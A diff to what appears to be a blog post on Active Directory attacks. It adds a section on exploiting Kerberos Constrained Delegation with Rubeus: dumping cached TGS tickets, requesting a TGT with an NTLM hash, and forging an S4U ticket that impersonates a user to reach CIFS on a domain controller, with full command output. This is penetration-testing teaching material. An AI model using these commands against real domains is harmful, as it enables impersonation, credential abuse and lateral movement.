@@ -25,6 +25,7 @@ Below is a list of the outlined attacks & topics.
 - Methods to Injection & Pass-The-Ticket
 - Unconstrained Delegation 
 - Constrained Delegation 
+- Resourced Based Delegation **(Coming Soon)**
 
 
 
@@ -1603,7 +1604,7 @@ PS C:\Users\m0chan> Get-ADComputer -Filter {(msDS-AllowedToDelegateTo -ne "{}")}
 
 #PowerView
 
-PS C:\Users\m0chan> Get-DomainComputer -Constrained 
+PS C:\Users\m0chan> Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol -Verbose | fl 
 ```
 
 
@@ -1635,4 +1636,108 @@ So if you've got this far you probably agree **Constrained Delegation** is confu
 
 
 #### [](#header-4)Exploiting with Rubeus
+
+
+
+Now as I mentioned exploiting **Constrained Delegation** is of course not as simple as exploiting **Unconstrained Delegation** due to the obvious limitations however once an attacker has discovered the servers/users configured for **Delegation** he/she would aim to dump all the cached `TGS` Tickets and/or use the `S4U2Self` extension to request a `TGS` ticket for any respective user to access said SPN they are configured to delegate too. 
+
+
+
+I am going to try formulate all examples I have saw from other articles on exploiting this, there can be quite a lot of different use cases. I am not copying... Well kinda but I think it's relevant that I have it all on this page.
+
+
+
+**Example 1 - Basic TGS Ticket Snatch**
+
+
+
+Now of course the first example that comes into mind is a basic one where I won't go step by step but I felt it was relevant to add this section. If we can gain access to a user/computer account configured for **Constrained Delegation** if we run the below command
+
+```powershell
+PS C:\Users\m0chan> .\Rubeus.exe dump
+```
+
+
+
+This will dump any relevant cached `TGS` ticket's stored on the box which we can then perform a `PTT` ticket attack similar to the `Pass-The-Ticket` section above.
+
+
+
+Relatively simple :) 
+
+**Example 2 - Plaintext Password too Service Access**
+
+Shoutout to @harmj0y & @gentilkiwi for this example. Really cool imo. 
+
+Basically this attack works around the basis that you have compromised a plaintext password of a user account that is trusted for **Constrained Delegation** and/or a NTLM hash. Basically you can use the pass the users password/NTLM hash, request a `TGT` & execute a request for a `TGS` ticket and of course access the respective `SPN` / `Service`
+
+
+
+**Request a TGT**
+
+```powershell
+PS C:\Users\m0chan> .\Rubeus.exe asktgt /user:m0chan /domain:m0chanAD.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+ 
+  v1.0.4
+ 
+[*] Action: Ask TGT
+ 
+[*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
+[*] Using domain controller: DC.m0chanAD.local (172.16.0.254)
+[*] Building AS-REQ (w/ preauth) for: 'm0chanAD.local\m0chan'
+[*] Connecting to 172.16.0.254:88
+[*] Sent 230 bytes
+[*] Received 1377 bytes
+[*] base64(ticket.kirbi):
+
+```
+
+
+
+**Issue S4U Request to Delegated SPN with Specified User**
+
+```powershell
+PS C:\Users\m0chan> .\Rubeus.exe s4u /ticket:C:\Temp\Tickets\aidanldap.kirbi /impersonateuser:aidan /msdsspn:ldap/dc.m0chanAD.local /altservice:cifs /ptt
+ 
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+ 
+  v1.0.0
+ 
+[*] Action: S4U
+ 
+[*] Using domain controller: PRIMARY.testlab.local (172.16.0.254)
+[*] Building S4U2self request for: 'TESTLAB.LOCAL\m0chan'
+[*]   Impersonating user 'aidan' to target SPN 'ldap/dc.m0chanAD.local'
+[*]   Final ticket will be for the alternate service 'cifs'
+[*] Sending S4U2self request
+[*] Connecting to 172.16.0.254:88
+[*] Sent 1437 bytes
+[*] Received 1574 bytes
+[+] S4U2self success!
+[*] Building S4U2proxy request for service: 'ldap/dc.m0chanAD.local'
+[*] Sending S4U2proxy request
+[*] Connecting to 172.16.0.254:88
+[*] Sent 2618 bytes
+[*] Received 1798 bytes
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'cifs'
+[*] base64(ticket.kirbi):
+ 
+      doIGujCCBragAwIBBaEDAgE...(snip)...
+ 
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+```
 
